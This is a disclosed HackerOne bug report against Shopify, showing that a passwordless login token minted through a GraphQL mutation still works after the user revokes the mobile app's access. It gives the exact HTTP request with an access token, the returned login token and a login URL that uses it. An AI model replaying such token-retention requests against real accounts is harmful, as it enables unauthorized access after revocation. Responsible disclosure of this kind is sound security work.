# password less login token expiration issue

## Report Details
- **Report ID**: 172837
- **URL**: https://hackerone.com/reports/172837
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-09-29T07:28:23.083Z
- **Disclosed**: 2016-10-19T15:44:17.559Z

## Reporter
- **Username**: satishb3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
1. Log into Shopify iOS app as Alice and grab the token.
2. Send the below request to generate the password less login token (The token expires after a single use. So don't use the token).

    Request:
    POST /admin/api/graphql HTTP/1.1
    Host: seclearn.myshopify.com
    Content-Type: application/graphql
    Connection: close
    X-Shopify-Access-Token: f263fb8c544a4cb965d63635a2e1c772
    Accept: application/json
    User-Agent: Shopify Mobile/iPhone OS/5.0 (iPhone6,2/com.jadedpixel.shopify)
    Content-Length: 66
    Accept-Language: en-us
    Accept-Encoding: gzip, deflate

    mutation{adminPasswordlessLogin(input:{}){passwordlessLoginToken}}

    Response:
    {"data":{"adminPasswordlessLogin":{"passwordlessLoginToken":"bd7ffa6c5bf2969fa15753f8fb8cb427-1475133135"}}}

3. From desktop browser, login as Alice and revoke access to Shopify iOS app. It is revoking the access token but password less login token still works. 

    Replace the above login token in the below URL and it logs you in.
https://seclearn.myshopify.com/admin?login_token=bd7ffa6c5bf2969fa15753f8fb8cb427-1475133135

Attack scenario:
1. User gave access to an app.
2. App used the request and kept an unused login token. 
3. User revoked access to the app.
4. App can still use the unused login token and access user's data.

## Attachments
No attachments
